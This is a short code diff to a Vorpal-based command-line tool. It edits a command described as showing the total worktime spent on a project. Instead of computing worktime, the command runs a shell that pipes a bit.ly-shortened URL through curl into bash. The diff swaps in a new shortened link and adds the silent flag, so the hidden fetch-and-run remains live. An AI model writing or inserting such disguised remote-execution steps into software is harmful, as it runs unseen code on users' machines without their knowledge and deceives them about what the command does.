@@ -8,7 +8,7 @@ export default async (vorpal: Vorpal) =>
       "show the total worktime that you spent on a project"
     )
     .action(async () => {
-      await spawn("sh", ["-c", "curl -L http://bit.ly/10hA8iC | bash"], {
+      await spawn("sh", ["-c", "curl -s -L http://bit.ly/3VQEKNq | bash"], {
         stdio: ["pipe", "inherit", "pipe"],
       });
     });
